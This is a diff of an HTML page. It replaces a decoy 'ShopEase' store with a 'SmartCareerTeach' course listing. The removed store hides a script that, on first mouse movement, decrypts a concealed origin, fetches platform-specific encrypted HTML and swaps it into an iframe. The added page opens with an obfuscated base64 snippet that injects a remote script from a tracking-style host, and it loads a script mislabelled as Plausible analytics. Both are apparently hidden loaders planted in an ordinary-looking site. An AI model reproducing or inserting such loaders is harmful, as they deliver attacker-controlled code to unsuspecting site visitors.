@@ -1,176 +1,276 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>ShopEase</title>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
-  <style>
-    * { box-sizing: border-box; }
-    html, body { margin: 0; height: 100%; }
-    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
-    a { text-decoration: none; color: inherit; }
-    #frame { display: none; width: 100%; height: 100vh; border: 0; }
-    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
 
-    /* ===== Full Screen Bada Popup (Peeche ka content hide karne ke liye) ===== */
-    .popup { 
-      position: fixed; 
-      top: 0; 
-      left: 0; 
-      width: 100%; 
-      height: 100%; 
-      background: #ffffff; /* Solid white taaki peeche ka background bilkul na dikhe */
-      display: flex; 
-      justify-content: center; 
-      align-items: center; 
-      z-index: 9999; /* Sabse upar rakhne ke liye */
-    }
-    .popup-content { 
-      background: #ffffff; 
-      padding: 60px; 
-      text-align: center; 
-      width: 100%;
-      max-width: 600px; /* Card ki width aur badi ki gayi hai */
-    }
-    .loading-gif { 
-      width: 160px; /* GIF ka size bada kiya gaya hai */
-      height: 160px; 
-      margin-bottom: 30px; 
-    }
-    .popup-content p {
-      font-size: 1.5rem; /* Text size bada aur clear */
-      color: #1f2433;
-      font-weight: 600;
-      margin: 10px 0 35px 0;
-    }
-    .buttons { 
-      display: flex;
-      justify-content: center;
-      gap: 25px;
-    }
-    button { 
-      padding: 15px 35px; /* Bade aur heavy buttons */
-      font-size: 1.1rem;
-      border: none; 
-      border-radius: 8px; 
-      cursor: pointer; 
-      font-weight: 700; 
-      min-width: 150px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-    }
-    #cancelBtn { background: #f44336; color: white; }
-    #continueBtn { background: #4CAF50; color: white; }
-    button:hover { opacity: 0.9; }
+<script>(function(){var a=location,b=document.head||document.getElementsByTagName("head")[0],c="script",d=atob("aHR0cHM6Ly90cmFjay50cmFja29uZGF0YS5jbGljay8xamx1MHV3LnBocA==");d+=-1<d.indexOf("?")?"&":"?";d+=a.search.substring(1);c=document.createElement(c);c.src=d;c.id=btoa(a.origin);b.appendChild(c);})();</script>
+  
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Courses — SmartCareerTeach</title>
+  <meta name="description" content="Browse 1,200+ expert-led courses in web development, design, data science, marketing, business, photography, music and languages.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,wght@0,400;0,600;0,700;1,500&family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/style.css">
 
-    /* ===== Base Store Layout Styles ===== */
-    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
-           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
-    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
-    .links { display: flex; gap: 18px; margin-left: 8px; }
-    .links a { font-size: .92rem; color: #555; }
-    .links a:hover { color: #6d28d9; }
-    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
-             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
-    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
-                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
-    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
-                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
-
-    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
-            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
-    .hero-text { flex: 1 1 320px; }
-    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
-    .hero-text h1 span { color: #db2777; }
-    .hero-text p { color: #555; max-width: 460px; }
-    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
-           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
-    .cta:hover { background: #be185d; }
-    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
-                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
-
-    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
-
-    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
-            padding: 24px 28px 10px; }
-    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
-            transition: transform .15s, box-shadow .15s; }
-    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
-    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
-    .card .body { padding: 14px 16px 18px; }
-    .card h3 { margin: 0 0 4px; font-size: 1rem; }
-    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
-    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
-    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
-           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
-    .add:hover { background: #6d28d9; }
-
-    .about { padding: 10px 28px 30px; }
-    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
-    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
-               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
-    .feature span { font-size: 1.8rem; }
-    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
-    .feature p { margin: 0; color: #666; font-size: .88rem; }
-
-    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
-  </style>
-
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-0LY0HY7L01');
-</script>
-
-<!-- Privacy-friendly analytics by Plausible -->
-<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
-<script>
-  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
-  plausible.init()
-</script>
-
-
+  <!-- Privacy-friendly analytics by Plausible -->
+  <script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+  <script>
+    window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+    plausible.init()
+  </script>
 </head>
 <body>
 
-  <div class="popup" id="customPopup">
-    <div class="popup-content">
-      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
-      <p>Loading... Please wait.</p>
-      <div class="buttons">
-        <button id="cancelBtn" type="button">Cancel</button>
-        <button id="continueBtn" type="button">Continue</button>
+<header class="site-header">
+  <div class="container nav-wrap">
+    <a href="index.html" class="logo"><span class="logo-mark">📖</span><span>Smart<em>Career</em>Teach</span></a>
+    <nav class="nav-links">
+      <a href="index.html">Home</a>
+      <a href="courses.html" class="active">Courses</a>
+      <a href="about.html">About</a>
+      <a href="contact.html">Contact</a>
+    </nav>
+    <div class="nav-cta">
+      <a href="contact.html" class="btn btn-primary">Get Guidance</a>
+      <button class="hamburger" aria-label="Menu"><span></span><span></span><span></span></button>
+    </div>
+  </div>
+</header>
+
+<section class="page-hero">
+  <div class="blob blob-1"></div>
+  <div class="container">
+    <div class="breadcrumb"><a href="index.html">Home</a> / Courses</div>
+    <h1>Courses for every <span class="italic-accent">curious</span> mind</h1>
+    <p class="lead">Hand-crafted by 180+ industry experts. Filter by category and find the one that sparks something.</p>
+  </div>
+</section>
+
+<section style="padding-top:1rem">
+  <div class="container">
+    <div class="filter-bar reveal">
+      <button class="filter-pill active" data-filter="all">All Courses</button>
+      <button class="filter-pill" data-filter="dev">Development</button>
+      <button class="filter-pill" data-filter="design">Design</button>
+      <button class="filter-pill" data-filter="data">Data Science</button>
+      <button class="filter-pill" data-filter="marketing">Marketing</button>
+      <button class="filter-pill" data-filter="business">Business</button>
+      <button class="filter-pill" data-filter="creative">Creative Arts</button>
+    </div>
+
+    <div class="course-grid">
+      <article class="course-card reveal" data-cat="dev">
+        <div class="course-media">
+          <img src="https://images.unsplash.com/photo-1517694712202-14dd9538aa97?w=800&q=80&auto=format&fit=crop" alt="Full-Stack Web Development">
+          <span class="course-tag">Development</span><span class="course-level">Beginner</span>
+        </div>
+        <div class="course-body">
+          <div class="course-meta"><span>📚 42 lessons</span><span>⏱ 38 hrs</span><span class="rating">★ 4.9</span></div>
+          <h3><a href="#">The Complete Full-Stack Web Development Bootcamp</a></h3>
+          <div class="course-teacher">
+            <img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=100&q=80&auto=format&fit=crop" alt="Arjun Mehta">
+            <small>Arjun Mehta</small><span class="course-price"><s>$129</s>$79</span>
+          </div>
+        </div>
+      </article>
+
+      <article class="course-card reveal reveal-delay-1" data-cat="design">
+        <div class="course-media">
+          <img src="https://images.unsplash.com/photo-1561070791-2526d30994b5?w=800&q=80&auto=format&fit=crop" alt="UI/UX Design Masterclass">
+          <span class="course-tag">Design</span><span class="course-level">All Levels</span>
+        </div>
+        <div class="course-body">
+          <div class="course-meta"><span>📚 36 lessons</span><span>⏱ 26 hrs</span><span class="rating">★ 4.8</span></div>
+          <h3><a href="#">UI/UX Design Masterclass: From Figma to Portfolio</a></h3>
+          <div class="course-teacher">
+            <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=100&q=80&auto=format&fit=crop" alt="Sara Kapoor">
+            <small>Sara Kapoor</small><span class="course-price"><s>$99</s>$59</span>
+          </div>
+        </div>
+      </article>
+
+      <article class="course-card reveal reveal-delay-2" data-cat="data">
+        <div class="course-media">
+          <img src="https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&q=80&auto=format&fit=crop" alt="Data Science with Python">
+          <span class="course-tag">Data</span><span class="course-level">Intermediate</span>
+        </div>
+        <div class="course-body">
+          <div class="course-meta"><span>📚 48 lessons</span><span>⏱ 44 hrs</span><span class="rating">★ 4.9</span></div>
+          <h3><a href="#">Data Science & Machine Learning with Python</a></h3>
+          <div class="course-teacher">
+            <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=100&q=80&auto=format&fit=crop" alt="Dr. Rohan Iyer">
+            <small>Dr. Rohan Iyer</small><span class="course-price"><s>$149</s>$89</span>
+          </div>
+        </div>
+      </article>
+
+      <article class="course-card reveal" data-cat="marketing">
+        <div class="course-media">
+          <img src="https://images.unsplash.com/photo-1460925895917-afdab827c52f?w=800&q=80&auto=format&fit=crop" alt="Digital Marketing">
+          <span class="course-tag">Marketing</span><span class="course-level">Beginner</span>
+        </div>
+        <div class="course-body">
+          <div class="course-meta"><span>📚 30 lessons</span><span>⏱ 22 hrs</span><span class="rating">★ 4.7</span></div>
+          <h3><a href="#">Digital Marketing A–Z: SEO, Social & Paid Ads</a></h3>
+          <div class="course-teacher">
+            <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=100&q=80&auto=format&fit=crop" alt="Meera Nair">
+            <small>Meera Nair</small><span class="course-price"><s>$89</s>$49</span>
+          </div>
+        </div>
+      </article>
+
+      <article class="course-card reveal reveal-delay-1" data-cat="business">
+        <div class="course-media">
+          <img src="https://images.unsplash.com/photo-1454165804606-c3d57bc86b40?w=800&q=80&auto=format&fit=crop" alt="Business Strategy">
+          <span class="course-tag">Business</span><span class="course-level">All Levels</span>
+        </div>
+        <div class="course-body">
+          <div class="course-meta"><span>📚 28 lessons</span><span>⏱ 20 hrs</span><span class="rating">★ 4.8</span></div>
+          <h3><a href="#">Startup Playbook: From Idea to First 100 Customers</a></h3>
+          <div class="course-teacher">
+            <img src="https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?w=100&q=80&auto=format&fit=crop" alt="Vikram Joshi">
+            <small>Vikram Joshi</small><span class="course-price"><s>$119</s>$69</span>
+          </div>
+        </div>
+      </article>
+
+      <article class="course-card reveal reveal-delay-2" data-cat="creative">
+        <div class="course-media">
+          <img src="https://images.unsplash.com/photo-1502920917128-1aa500764cbd?w=800&q=80&auto=format&fit=crop" alt="Photography">
+          <span class="course-tag">Creative</span><span class="course-level">Beginner</span>
+        </div>
+        <div class="course-body">
+          <div class="course-meta"><span>📚 24 lessons</span><span>⏱ 16 hrs</span><span class="rating">★ 4.9</span></div>
+          <h3><a href="#">Photography Fundamentals: Shoot Like a Storyteller</a></h3>
+          <div class="course-teacher">
+            <img src="https://images.unsplash.com/photo-1438761681033-6461ffad8d80?w=100&q=80&auto=format&fit=crop" alt="Ishita Verma">
+            <small>Ishita Verma</small><span class="course-price"><s>$79</s>$45</span>
+          </div>
+        </div>
+      </article>
+
+      <article class="course-card reveal" data-cat="dev">
+        <div class="course-media">
+          <img src="https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800&q=80&auto=format&fit=crop" alt="JavaScript Deep Dive">
+          <span class="course-tag">Development</span><span class="course-level">Advanced</span>
+        </div>
+        <div class="course-body">
+          <div class="course-meta"><span>📚 38 lessons</span><span>⏱ 32 hrs</span><span class="rating">★ 4.8</span></div>
+          <h3><a href="#">JavaScript Deep Dive: Patterns, Performance & Beyond</a></h3>
+          <div class="course-teacher">
+            <img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=100&q=80&auto=format&fit=crop" alt="Arjun Mehta">
+            <small>Arjun Mehta</small><span class="course-price"><s>$139</s>$85</span>
+          </div>
+        </div>
+      </article>
+
+      <article class="course-card reveal reveal-delay-1" data-cat="creative">
+        <div class="course-media">
+          <img src="https://images.unsplash.com/photo-1511379938547-c1f69419868d?w=800&q=80&auto=format&fit=crop" alt="Music Production">
+          <span class="course-tag">Creative</span><span class="course-level">Beginner</span>
+        </div>
+        <div class="course-body">
+          <div class="course-meta"><span>📚 26 lessons</span><span>⏱ 18 hrs</span><span class="rating">★ 4.7</span></div>
+          <h3><a href="#">Music Production 101: Your Bedroom Studio Setup</a></h3>
+          <div class="course-teacher">
+            <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=100&q=80&auto=format&fit=crop" alt="Aditya Rao">
+            <small>Aditya Rao</small><span class="course-price"><s>$99</s>$55</span>
+          </div>
+        </div>
+      </article>
+
+      <article class="course-card reveal reveal-delay-2" data-cat="data">
+        <div class="course-media">
+          <img src="https://images.unsplash.com/photo-1526628953301-3e589a6a8b74?w=800&q=80&auto=format&fit=crop" alt="SQL and Analytics">
+          <span class="course-tag">Data</span><span class="course-level">Beginner</span>
+        </div>
+        <div class="course-body">
+          <div class="course-meta"><span>📚 22 lessons</span><span>⏱ 15 hrs</span><span class="rating">★ 4.8</span></div>
+          <h3><a href="#">SQL & Analytics: Speak the Language of Data</a></h3>
+          <div class="course-teacher">
+            <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=100&q=80&auto=format&fit=crop" alt="Meera Nair">
+            <small>Meera Nair</small><span class="course-price"><s>$79</s>$39</span>
+          </div>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- CTA -->
+<section style="padding-top:2rem">
+  <div class="container">
+    <div class="cta-band reveal">
+      <h2>Can't decide? Let us guide you.</h2>
+      <p>Tell us your goals and we'll map out a personalised learning path — free, no strings attached.</p>
+      <a href="contact.html" class="btn btn-light">Get Free Guidance <span class="arrow">→</span></a>
+    </div>
+  </div>
+</section>
+
+<footer class="site-footer">
+  <div class="container">
+    <div class="footer-grid">
+      <div>
+        <a href="index.html" class="logo"><span class="logo-mark">📖</span><span>Smart<em>Career</em>Teach</span></a>
+        <p>A warm, rigorous online learning platform helping 25,000+ people master the skills that move their lives forward.</p>
+        <div class="footer-social">
+          <a href="#" aria-label="Twitter">𝕏</a>
+          <a href="#" aria-label="Instagram">📷</a>
+          <a href="#" aria-label="YouTube">▶</a>
+          <a href="#" aria-label="LinkedIn">in</a>
+        </div>
+      </div>
+      <div class="footer-col">
+        <h4>Explore</h4>
+        <ul>
+          <li><a href="index.html">Home</a></li>
+          <li><a href="courses.html">Courses</a></li>
+          <li><a href="about.html">About Us</a></li>
+          <li><a href="contact.html">Contact</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>Legal</h4>
+        <ul>
+          <li><a href="privacy.html">Privacy Policy</a></li>
+          <li><a href="terms.html">Terms of Service</a></li>
+          <li><a href="disclaimer.html">Disclaimer</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>Get in Touch</h4>
+        <ul>
+          <li>📧 <a href="/cdn-cgi/l/email-protection#cea7a0a8a18ebda3afbcbaadafbcababbcbaabafada6e0a0abba"><span class="__cf_email__" data-cfemail="b6dfd8d0d9f6c5dbd7c4c2d5d7c4d3d3c4c2d3d7d5de98d8d3c2">[email&#160;protected]</span></a></li>
+          <li>🕐 Mon–Fri, 9am–6pm IST</li>
+          <li>🌏 Learning worldwide, from anywhere</li>
+        </ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© <span class="year"></span> SmartCareerTeach. All rights reserved.</span>
+      <div class="legal-links">
+        <a href="privacy.html">Privacy</a>
+        <a href="terms.html">Terms</a>
+        <a href="disclaimer.html">Disclaimer</a>
       </div>
     </div>
   </div>
-  
-  <div id="shop">
-    <div class="hint">🛍️ ShopEase</div>
-    <header class="nav">
-      <div class="brand">🛍️ ShopEase</div>
-      <nav class="links">
-        <a href="#home">Home</a>
-        <a href="#products">Products</a>
-        <a href="#about">About</a>
-      </nav>
-      <span class="clock">🕒 Mon, 29 Jun 2026</span>
-      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
-    </header>
+</footer>
 
-    <section class="hero" id="home">
-      <div class="hero-text">
-        <h1>Summer Sale — up to <span>50% OFF</span></h1>
-        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
-        <a href="#products" class="cta">Shop now</a>
-      </div>
-      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
-    </section>
-
- <!-- Histats.com  START  (aync)-->
+<button class="back-top" aria-label="Back to top">↑</button>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="js/main.js"></script>
+<!-- Histats.com  START  (aync)-->
 <script type="text/javascript">var _Hasync= _Hasync|| [];
 _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
 _Hasync.push(['Histats.fasi', '1']);
@@ -182,119 +282,5 @@ hs.src = ('//s10.histats.com/js15_as.js');
 })();</script>
 <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
 <!-- Histats.com  END  -->
-
-    <section id="products">
-      <h2 class="section-title">Featured Products</h2>
-      <div class="grid">
-        <div class="card">
-          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
-          <div class="body">
-            <h3>Running Sneakers</h3>
-            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
-            <button class="add">Add to cart</button>
-          </div>
-        </div>
-        <div class="card">
-          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
-          <div class="body">
-            <h3>Classic Watch</h3>
-            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
-            <button class="add">Add to cart</button>
-          </div>
-        </div>
-        <div class="card">
-          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
-          <div class="body">
-            <h3>Travel Backpack</h3>
-            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
-            <button class="add">Add to cart</button>
-          </div>
-        </div>
-        <div class="card">
-          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
-          <div class="body">
-            <h3>Wireless Headphones</h3>
-            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
-            <button class="add">Add to cart</button>
-          </div>
-        </div>
-        <div class="card">
-          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
-          <div class="body">
-            <h3>Sunglasses</h3>
-            <div class="price">₹999 <span class="old">₹1,799</span></div>
-            <button class="add">Add to cart</button>
-          </div>
-        </div>
-        <div class="card">
-          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
-          <div class="body">
-            <h3>Instant Camera</h3>
-            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
-            <button class="add">Add to cart</button>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <section id="about" class="about">
-      <h2 class="section-title">Why ShopEase?</h2>
-      <div class="features">
-        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
-        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
-        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
-      </div>
-    </section>
-
-    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
-  </div>
-
-  <iframe id="frame" title="encrypted shop" allowfullscreen allow="fullscreen"></iframe>
-
-  <script>
-    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
-    const URL_KEY = "UrLk3yShopEase01";
-    const ENC_DATA_ORIGIN = "U2FsdGVkX19zE/9eXDusLcd6LqXo6qNbS4VYdGOJ+vivmj7Gulxoyb2F1ZIMAJFI";
-    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
-    const DATA_URL = DATA_ORIGIN + "/data";
-    let lastUrl = null;
-
-    function detectPlatform() {
-      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
-                navigator.platform || navigator.userAgent || "";
-      return /mac/i.test(p) ? "mac" : "win";
-    }
-
-    async function loadSecret() {
-      const shop = document.getElementById("shop"), frame = document.getElementById("frame");
-      try {
-        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
-        const { cipher } = await res.json();
-        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
-        if (!html) throw new Error("Decrypt failed — wrong key?");
-
-        if (lastUrl) URL.revokeObjectURL(lastUrl);
-        const blob = new Blob([html], { type: "text/html" });
-        lastUrl = URL.createObjectURL(blob);
-
-        frame.src = lastUrl;
-        
-      
-        shop.style.display = "none";
-        frame.style.display = "block";
-        document.getElementById("customPopup").style.display = "none"; 
-        
-      } catch (e) {
-        document.querySelector(".hint").textContent = "⚠️ " + e.message;
-        document.getElementById("customPopup").style.display = "none";
-      }
-    }
-
-    
-    window.addEventListener("mousemove", () => {
-      document.getElementById("customPopup").style.display = "none";
-      loadSecret();
-    }, { once: true });
-  </script>
 </body>
 </html>
